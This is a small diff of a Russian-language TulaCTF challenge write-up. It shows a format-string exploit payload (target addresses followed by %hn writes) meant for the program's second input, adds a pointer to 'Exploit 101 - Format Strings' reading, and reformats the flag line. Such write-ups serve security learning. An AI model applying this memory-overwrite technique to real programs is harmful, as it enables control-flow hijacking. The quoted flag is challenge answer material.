@@ -41,6 +41,9 @@
 Вот эксплойт, который нужно вести во второй ввод:
 > \xa2\xb2\x04\x08\xa0\xb2\x04\x08%2044x%4$hn%35234x%5$hn
 
-## Flag ```TulaCTF{Da_Zdravstvuet_Tula_Da_Zdravstvuet_71}```
+Для более подробного изучения рекомендую почитать статьи на тему "Exploit 101 - Format Strings"
+
+## Flag 
+```TulaCTF{Da_Zdravstvuet_Tula_Da_Zdravstvuet_71}```
 
 
